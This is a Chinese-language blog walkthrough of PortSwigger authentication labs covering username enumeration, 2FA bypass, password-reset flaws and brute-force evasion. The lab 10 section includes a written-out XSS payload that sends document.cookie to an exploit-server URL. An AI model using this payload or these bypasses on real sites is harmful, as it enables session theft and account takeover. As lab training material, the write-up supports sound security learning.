@@ -1,0 +1,340 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <title>PortSwigger Authentication | Arcueid&#39;s BLOG</title>
+    <meta name="author" content="Arcueid" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <link rel="icon" href="/images/Arcueid.jpg" />
+    <link rel="preconnect" href="https://cdn.staticfile.net" />
+<script src="https://cdn.staticfile.net/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://cdn.staticfile.net/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.loli.net" />
+<link rel="preconnect" href="https://gstatic.loli.net" crossorigin />
+<link rel="stylesheet" href="https://fonts.loli.net/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap" />
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://cdn.staticfile.net/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://cdn.staticfile.net/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://cdn.staticfile.net/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+<script src="https://cdn.staticfile.net/KaTeX/0.16.9/katex.min.js"></script>
+<script src="https://cdn.staticfile.net/KaTeX/0.16.9/contrib/auto-render.min.js"></script>
+<link rel="stylesheet" href="https://cdn.staticfile.net/KaTeX/0.16.9/katex.min.css" />
+<script src="/js/lib/math.js"></script>
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>ARCUEID&#39;S BLOG</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;ARCUEID&#39;S BLOG</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>PortSwigger Authentication</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/12/26
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            
+            <span class="tag">
+                
+                <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #ff7d73">网络安全</a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/linux/" style="color: #ffa2c4">linux</a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #ff7d73">安全</a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8/" style="color: #00bcd4">服务器</a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" style="color: #03a9f4">数据库</a>
+            </span>
+            
+        </span>
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <h3 id="lab1-Username-enumeration-via-different-responses"><a href="#lab1-Username-enumeration-via-different-responses" class="headerlink" title="lab1: Username enumeration via different responses"></a>lab1: Username enumeration via different responses</h3><p>给了可能的用户名密码</p>
+<p>直接爆</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/30703bd4d550c01beface107489ef71e.png" alt="image-20231223120519323"></p>
+<h3 id="lab2-2FA-broken-logic"><a href="#lab2-2FA-broken-logic" class="headerlink" title="lab2: 2FA broken logic"></a>lab2: 2FA broken logic</h3><p>access Carlos’s account page</p>
+<p>登录步骤如下</p>
+<p>&#x2F;login1 验证用户名密码</p>
+<p>&#x2F;login2 发验证码 验证验证码</p>
+<p>其中访问login2的时候会带上cookie</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/cb4d99ffcb80b47cb23b4b755ac9ab3a.png" alt="image-20231221172230175"></p>
+<p>猜测当vertify的值为carlos的时候 会向carlos的邮箱发验证码</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/e31c55a6aa4b3138d6e30312a4343d89.png" alt="image-20231221172305209"></p>
+<p>然后post &#x2F;login2 传mfa-code</p>
+<p>由于没有限制 考虑爆破</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/5d18d8ab7e474ffae9da17b95b283526.png" alt="image-20231221172011276"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/cd27fee3777bdbc76c5392c7d0987e6b.png"></p>
+<h3 id="lab3-Password-reset-broken-logic"><a href="#lab3-Password-reset-broken-logic" class="headerlink" title="lab3: Password reset broken logic"></a>lab3: Password reset broken logic</h3><p>重置密码的最后一个阶段 我们传的参数中带了username 尝试改为carlos</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/b46c4681a19bb8b4fd7f269900bef394.png" alt="image-20231222083239003"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/d3a6eb25e40581acec71c0a801e6428c.png" alt="image-20231222083314943"></p>
+<h3 id="lab4-Username-enumeration-via-subtly-different-responses"><a href="#lab4-Username-enumeration-via-subtly-different-responses" class="headerlink" title="lab4: Username enumeration via subtly different responses"></a>lab4: Username enumeration via subtly different responses</h3><p>​	<img src="https://img-blog.csdnimg.cn/img_convert/893f531f5b73325b2fb0fa319ede20df.png" alt="image-20231223123242719"></p>
+<p>看了一下solution</p>
+<p>是先跑的合法用户名 再爆的密码</p>
+<p>过程如下</p>
+<p>当账户不合法的时候返回的是</p>
+<p><code>Invalid username or password.</code> 合法的时候返回 <code>Invalid username or password</code></p>
+<p>相差一个.</p>
+<p>然后得到账户再爆密码就快多了</p>
+<h3 id="lab5-Username-enumeration-via-response-timing"><a href="#lab5-Username-enumeration-via-response-timing" class="headerlink" title="lab5: Username enumeration via response timing"></a>lab5: Username enumeration via response timing</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/f0ad5c9c11feaa2c579888d0ba60882c.png" alt="image-20231223123953214"></p>
+<p>加XFF</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/46bc8b5787124f5d8d3a0b54507ea61c.png" alt="image-20231223234352651"></p>
+<p>这个环境下username正确 密码越长响应时间越久</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/bb87f7929b3097e461e4c6278edda71c.png" alt="image-20231223234719148"></p>
+<h3 id="lab6-Broken-brute-force-protection-IP-block"><a href="#lab6-Broken-brute-force-protection-IP-block" class="headerlink" title="lab6: Broken brute-force protection, IP block"></a>lab6: Broken brute-force protection, IP block</h3><p>比较扯淡</p>
+<p>登录失败三次ban ip</p>
+<p>在ban ip之前登录正确可以重置计数器</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/dd63ab9c13d0ef7314ed3e7af7a1df0b.png" alt="image-20231224000510026"></p>
+<p>开俩爆破 一个跑正确密码</p>
+<p>另一个爆密码 加个延迟</p>
+<h3 id="lab7-Username-enumeration-via-account-lock"><a href="#lab7-Username-enumeration-via-account-lock" class="headerlink" title="lab7: Username enumeration via account lock"></a>lab7: Username enumeration via account lock</h3><p>先多多爆几次 把合法的用户爆出来</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/48cfac6306ae1c0d4bb3f0413c786f12.png" alt="image-20231224002156541"></p>
+<p>然后爆密码</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/2c40dcbf9befca5bcb4b88074d1dbcbc.png" alt="image-20231224003104874"></p>
+<p>这个没回显的就是正确的密码 等待一分钟后提交</p>
+<h3 id="lab8-2FA-simple-bypass"><a href="#lab8-2FA-simple-bypass" class="headerlink" title="lab8: 2FA simple bypass"></a>lab8: 2FA simple bypass</h3><p>莫名其妙完成的</p>
+<p>回头去看solution</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/5d46832fe1ab98d3eaacf775d73a4da4.png" alt="image-20231222084522132"></p>
+<p>说是在carlos接收到验证码的时候</p>
+<p>直接访问&#x2F;my-account</p>
+<p>我的理解是这里的登录分3步 login login2 然后重定向到my-account</p>
+<p>在login2处直接访问my-account就跳过了login2的验证</p>
+<h3 id="lab9-Brute-forcing-a-stay-logged-in-cookie"><a href="#lab9-Brute-forcing-a-stay-logged-in-cookie" class="headerlink" title="lab9: Brute-forcing a stay-logged-in cookie"></a>lab9: Brute-forcing a stay-logged-in cookie</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/f9b477221fb747c1b1ad29543b9cd19b.png" alt="image-20231224093854165"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/d61bb596477c6c15a0c476ee90568920.png" alt="image-20231224093926060"></p>
+<p>cookie的构成是<code>用户名:密码md5</code></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/489a548d4def33f2939d8a135e14fcce.png" alt="image-20231224094244662"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/19cbcb5ef08febdc78873cb309ebc0ee.png" alt="image-20231224094531172"></p>
+<h3 id="lab10-Offline-password-cracking"><a href="#lab10-Offline-password-cracking" class="headerlink" title="lab10: Offline password cracking"></a>lab10: Offline password cracking</h3><p><code>&lt;script&gt;document.location=&#39;https://exploit-0a82002e033db374830b2db4013f00bd.exploit-server.net/exploit&#39;+document.cookie&lt;/script&gt;</code></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/f43eaa66e9cc604a0661a85e5fd86a3a.png" alt="image-20231224095300277"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/ea7f9493bcae048892e419a0c5e06a33.png" alt="image-20231224095329698"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/662db9d25a4e84c16eea7111508d4cdf.png" alt="image-20231224095509229"></p>
+<h3 id="lab11-Password-reset-poisoning-via-middleware"><a href="#lab11-Password-reset-poisoning-via-middleware" class="headerlink" title="lab11: Password reset poisoning via middleware"></a>lab11: Password reset poisoning via middleware</h3><p>看solution得知支持X-Forwarded-Host 可以使用它来将动态生成的重置链接指向任意域</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/30f4fcae85f6dcddc2a62893d6ba174a.png" alt="image-20231224101120014"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/5680bce70e54bfef26d3e354e07d779e.png" alt="image-20231224101113433"></p>
+<h3 id="lab12-Password-brute-force-via-password-change"><a href="#lab12-Password-brute-force-via-password-change" class="headerlink" title="lab12: Password brute-force via password change"></a>lab12: Password brute-force via password change</h3><p>当新密码不一致且密码正确的时候会报new pass do not match</p>
+<p>密码错误的时候会报 Current password is incorrect</p>
+<p>user换carlos爆</p>
+<p>在爆破的时候要确保当前的cookie是可用的 不然会302到登录界面</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/1f78b2374f24a3f41f072076ee2d17ca.png" alt="image-20231224102948479"></p>
+<h3 id="lab13-Broken-brute-force-protection-multiple-credentials-per-request"><a href="#lab13-Broken-brute-force-protection-multiple-credentials-per-request" class="headerlink" title="lab13: Broken brute-force protection, multiple credentials per request"></a>lab13: Broken brute-force protection, multiple credentials per request</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/7da1cbbf8f081fb2e4961a629962fa91.png" alt="image-20231224104315991"></p>
+<p>用了json来传输密码</p>
+<p>考虑把密码改成数组</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/2497d50253d66bffec672da906a4fc76.png" alt="image-20231224104344602"></p>
+<h3 id="lab14-2FA-bypass-using-a-brute-force-attack"><a href="#lab14-2FA-bypass-using-a-brute-force-attack" class="headerlink" title="lab14: 2FA bypass using a brute-force attack"></a>lab14: 2FA bypass using a brute-force attack</h3><p>学习burp宏的使用</p>
+<p>add 一个 session rule</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/3fd4509ddc58f1756ad68bb93ec39532.png" alt="image-20231224113001702"></p>
+<p>urlscope选择all</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/ff74aeda625e1ed1d418f248efedc5df.png" alt="image-20231224113025345"></p>
+<p>新建规则</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/a0a9c5bec18d846e145ee3511a86a27f.png" alt="image-20231224113047588"></p>
+<p>新建宏</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/5afbff00bec4bfbbff1048ff2955ce8d.png" alt="image-20231224113101239"></p>
+<p>手动去完成一次登录操作 login -&gt; login2</p>
+<p>然后在宏里选择对应的数据包</p>
+<p>test macro测试下POST login2是否返回200</p>
+<p>200就说明操作对了</p>
+<p>一路ok下去 回头设置intruder</p>
+<p>确保一个线程<img src="https://img-blog.csdnimg.cn/img_convert/20c94016196cab92e7e18dff6fadfd6e.png" alt="image-20231224113229244"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/418d4a380d9891c8e9192b68810da766.png" alt="image-20231224112651249"></p>
+<p>手动跳转一下<img src="https://img-blog.csdnimg.cn/img_convert/4af393c3801e5960d422ca3bcc751ac7.png" alt="image-20231224112838264"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/b5eb4b073a61f048582271fe5172a5f7.png" alt="image-20231224112943782"></p>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2024 Arcueid&#39;s BLOG
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;Arcueid
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+
+
+
+
+    
+</body>
+</html>
